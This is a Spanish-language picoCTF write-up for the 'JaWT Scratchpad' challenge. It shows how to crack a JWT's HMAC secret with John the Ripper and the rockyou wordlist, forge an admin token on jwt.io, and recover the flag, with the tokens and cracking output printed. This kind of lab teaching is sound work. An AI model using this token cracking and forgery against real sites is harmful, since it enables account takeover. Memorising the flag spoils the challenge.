## JaWT Scratchpad 

### Objetivos 
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

### Pistas
1. What is that cookie?
2. Have you heard of JWT?

### Solución 

- hacemos login con nuestro nombre
- extraemos el token generado de la cookie, con el complemento del navegador
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic2F1bCJ9.s2yNYA4r8kHDSdf8Rolh2TSltGEQhDRG2cnkha_EBjY
```

- creamos un archivo y pegamos el token dentro
``` bash
┌──(kali㉿kali)-[~]
└─$ touch mijwt

┌──(kali㉿kali)-[~]
└─$ nano mijwt 

```

ejecutamos el siguiente comando de john en el archivo que contiene el token para obtener la contraseña
``` bash
┌──(kali㉿kali)-[~] 
└─$ john mijwt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:03 DONE (2023-10-03 23:26) 0.3134g/s 2318Kp/s 2318Kc/s 2318KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- En caso de darnos error de Codificación, extraemos el archivo rockyou.txt.gz
``` bash
(kali㉿kali)-[~]
└─$ sudo gzip -d  /usr/share/wordlists/rockyou.txt.gz
```

- obtenemos la contraseña del token: 'ilovepico'

- en https://jwt.io/ pegamos el token.

- en la parte de PAYLOAD:DATA 
	sustituimos el usuario por admin

- en la parte de VERIFY SIGNATURE 
	colocamos la contraseña del token 'ilovepico'

- copiamos el nuevo token y lo pegamos en la cookie.
``` 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```

- recargamos la pagina y obtenemos la bandera del nivel

picoCTF{jawt_was_just_what_you_thought_44c752f5}

### Notas adicionales:
- John: john es una herramienta para hackear contraseñas por fuerza bruta.
- rockyou.txt: el archivo rockyou de john contiene una gran cantidad de contraseñas genéricas.

### Referencias:
jwt: https://jwt.io/
json: https://www.json.org/json-es.html
JSON Web Tokens: https://jwt.io/